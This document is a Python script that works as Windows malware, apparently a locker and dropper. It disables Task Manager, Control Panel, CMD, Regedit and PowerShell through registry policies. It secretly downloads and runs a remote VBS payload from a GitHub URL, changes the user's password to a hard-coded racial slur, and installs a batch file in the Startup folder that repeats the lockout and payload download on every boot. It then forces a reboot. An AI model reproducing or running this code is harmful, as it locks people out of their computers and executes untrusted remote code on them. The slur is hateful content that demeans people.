# python

import os
import subprocess
import shutil
import ctypes

# Disable Task Manager, Settings, CMD, Administrator CMD, Regedit, PowerShell
def disable_features():
    keys = [
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoControlPanel", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableCMD", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1),
        ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisablePowerShell", 1),
    ]

    for key, value_name, value in keys:
        subprocess.run(['reg', 'add', key, '/v', value_name, '/t', 'REG_DWORD', '/d', str(value), '/f'], check=True)

# Run the PowerShell script
def run_powershell_script():
    powershell_command = (
        "powershell -WindowStyle Hidden -NoProfile -Command "
        '"$p=$env:APPDATA+\'Microsoft\\Windows\\PowerShell\\PSReadLine\\xzhdbzkxskjhda.vbs\';" '
        '"if(-not (Test-Path $p)){" '
        '"iwr https://raw.githubusercontent.com/SkiddKillz/VBS/refs/heads/main/VBS.vbs -OutFile $p };" '
        '"if(Test-Path $p){ Start-Process $p }"'
    )
    subprocess.run(powershell_command, shell=True, check=True)

# Change user account password
def change_user_password():
    username = os.getenv('USERNAME')
    new_password = "NIGGERGOTFEDDED"
    subprocess.run(['net', 'user', username, new_password], check=True)

# Create a new batch script
def create_batch_script():
    batch_content = (
        "@echo off\n"
        ":: Disable Task Manager, Settings, CMD, Administrator CMD, Regedit, PowerShell\n"
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f\n"
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n"
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 1 /f\n"
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 1 /f\n"
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisablePowerShell /t REG_DWORD /d 1 /f\n\n"
        ":: Run the script\n"
        "conhost.exe --headless powershell -WindowStyle Hidden -NoProfile -Command ^^\n"
        "  \"$p=$env:APPDATA+'\\Microsoft\\Windows\\PowerShell\\PSReadLine\\xzhdbzkxskjhda.vbs\';\" ^^\n"
        "  \"if(-not (Test-Path $p)){\" ^^\n"
        "  \"iwr https://raw.githubusercontent.com/SkiddKillz/VBS/refs/heads/main/VBS.vbs -OutFile $p };\" ^^\n"
        "  \"if(Test-Path $p){ Start-Process $p }\""
    )
    batch_path = os.path.join(os.getenv('TEMP'), 'disable_features.bat')
    with open(batch_path, 'w') as batch_file:
        batch_file.write(batch_content)
    return batch_path

# Move the batch script to the startup folder
def move_to_startup(batch_path):
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shutil.copy(batch_path, startup_path)

# Restart the computer
def restart_computer():
    ctypes.windll.user32.ExitWindowsEx(2, 0)

if __name__ == "__main__":
    disable_features()
    run_powershell_script()
    change_user_password()
    batch_path = create_batch_script()
    move_to_startup(batch_path)
    restart_computer()
